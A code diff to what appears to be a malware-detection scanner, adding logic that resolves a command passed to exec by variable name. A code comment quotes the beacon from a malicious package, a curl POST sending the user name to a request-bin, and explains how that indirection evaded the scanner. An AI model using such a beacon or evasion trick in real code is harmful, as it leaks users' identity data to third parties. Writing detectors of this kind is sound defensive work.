@@ -123,7 +123,22 @@ def extract(text: str, language: str | None = None) -> list[Command]:
             break
 
         window = text[call.end() : call.end() + _ARGUMENT_WINDOW]
-        parts = _literals(window[: _close_paren(window)])
+        arguments = window[: _close_paren(window)]
+        parts = _literals(arguments)
+        if not parts:
+            # The command may be a name rather than a literal. One line of
+            # indirection defeated all of this:
+            #
+            #     const command = `curl -X POST "https://.../$(whoami)/" ...`;
+            #     exec(command, (error, stdout, stderr) => { ... });
+            #
+            # That is `elf-stats-candystriped-muffin-773` and eight siblings
+            # published the same week, each a 391-byte beacon that posts the
+            # user and host name to a request-bin. Cordon reported NOTHING on
+            # them: the JavaScript rules see `exec` handed a variable, and the
+            # shell rules never run because the file is JavaScript, so the
+            # command was read by nobody.
+            parts = _assigned_literal(text, arguments, call.start())
         if not parts:
             continue
 
@@ -135,6 +150,39 @@ def extract(text: str, language: str | None = None) -> list[Command]:
         )
 
     return commands
+
+
+_NAME = re.compile(r"^[ \t]*([A-Za-z_$][\w$]{0,64})[ \t]*[,)]")
+"""A bare identifier as the first argument: `exec(command, ...)`."""
+
+
+def _assignment(name: str) -> re.Pattern[str]:
+    """`const NAME =`, `let NAME =`, `var NAME =`, or a bare `NAME =`."""
+    return re.compile(rf"(?:const|let|var)?[ \t]*\b{re.escape(name)}[ \t]*=[ \t]*")
+
+
+def _assigned_literal(text: str, arguments: str, call_start: int) -> list[str]:
+    """The literal assigned to the name a spawn call was handed, if there is one.
+
+    Only backwards, and only within this file: the value has to be established
+    before the call to be the value the call receives, and a name assigned
+    afterwards is a different binding or a later one. Only the LAST assignment
+    before the call is read, for the same reason.
+
+    Nothing clever about scope or reassignment is attempted. This resolves the
+    one shape that actually hides commands -- a string built once and passed by
+    name -- and returns nothing when it cannot be sure.
+    """
+    named = _NAME.match(arguments)
+    if named is None:
+        return []
+    before = text[:call_start]
+    last = None
+    for assignment in _assignment(named.group(1)).finditer(before):
+        last = assignment
+    if last is None:
+        return []
+    return _literals(before[last.end() : last.end() + _ARGUMENT_WINDOW])
 
 
 def _literals(window: str) -> list[str]:
